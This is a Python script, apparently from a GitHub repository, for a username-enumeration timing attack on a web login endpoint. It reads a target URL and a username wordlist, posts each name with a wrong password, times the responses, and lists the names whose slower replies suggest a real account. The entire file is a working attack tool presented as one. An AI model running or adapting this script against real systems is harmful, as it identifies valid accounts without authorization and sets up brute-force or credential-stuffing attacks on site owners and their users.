import requests
import time
import json
from tqdm import tqdm
import sys

whoami="""
[+] Coded By : WhoKilledDB?
[+] Github Link TO Repositotry : https://github.com/whokilleddb/timingattack
"""
print("\033[1m\033[01;35m"+whoami+"\033[00m")


try : 
    URL=input("[+] Enter URL : ")
    USERNAME_FILE_NAME=input("[+] Enter Use Name List : ")
    usernames=[]
    USER_NAMES=open(USERNAME_FILE_NAME,"r")
    for line in USER_NAMES :
        usernames.append(line.replace("\n", ""))
except FileNotFoundError :
    print("[-] File Not Found !")
    sys.exit(-1)

intervals = dict()

def tryLogin(user): 
    creds = {"username": user, "password": "WrongPassword"}
    response = requests.post(URL, json=creds)
    if response.status_code != 200:
        print("[+] Error : ", response.status_code)


print("[+] Performing Checks")


try : 
    tryLogin("testuser")
except Exception as e :
    print(f"[-] Error Raised As : {e}")
    sys.exit(-1)

print("[+] CHECKS OK")
print("[+] Starting Attack")

for user in tqdm(usernames,desc="[+] Sending POST requests " , unit=" Usernames"):
    start=time.time()
    tryLogin(user)
    stop=time.time()
    intervals[user]=stop-start
    time.sleep(0.01)

print("[+] Finished Attack")


largest=max(intervals.values())
smallest=min(intervals.values())
delta=largest-smallest

print(f"[+] Delta = {delta}")
tolerence = 100
while tolerence > 1 or tolerence < 0 :
    tolerence=float(input("[+] Enter Tolerence Value : "))

print(f"[+] Tolerence Set To : {tolerence}")
tolerence=1-tolerence
for user,time in intervals.items():
    if time >= largest*tolerence:
        print(f"[+] {user} : {time}")
